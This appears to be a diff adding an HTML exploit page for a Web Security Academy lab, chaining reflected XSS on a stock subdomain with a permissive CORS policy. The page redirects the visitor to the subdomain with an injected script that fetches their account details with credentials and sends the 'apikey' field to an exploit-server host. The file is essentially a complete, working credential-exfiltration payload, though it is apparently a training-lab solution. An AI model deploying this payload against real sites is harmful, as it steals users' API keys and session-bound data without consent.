@@ -1,0 +1,22 @@
+<html>
+  <body>
+    <h1>Hello</h1>
+    <script>
+      let script = `\x3Cscript>
+        fetch('https://0a5700430450cc4a806d441f00d8008d.web-security-academy.net/accountDetails', {
+          method: 'GET',
+          credentials: 'include'
+        })
+        .then(response => {
+          return response.json();
+        })
+        .then(body => {
+          fetch("https://exploit-0acc005e04f6cc42809043f2018000dd.exploit-server.net/logs?res=" + body.apikey);
+        })
+      \x3C/script>`
+      location = "http://stock.0a5700430450cc4a806d441f00d8008d.web-security-academy.net/?productId="
+        + encodeURIComponent(script)
+        + "&storeId=1"
+    </script>
+  </body>
+</html>
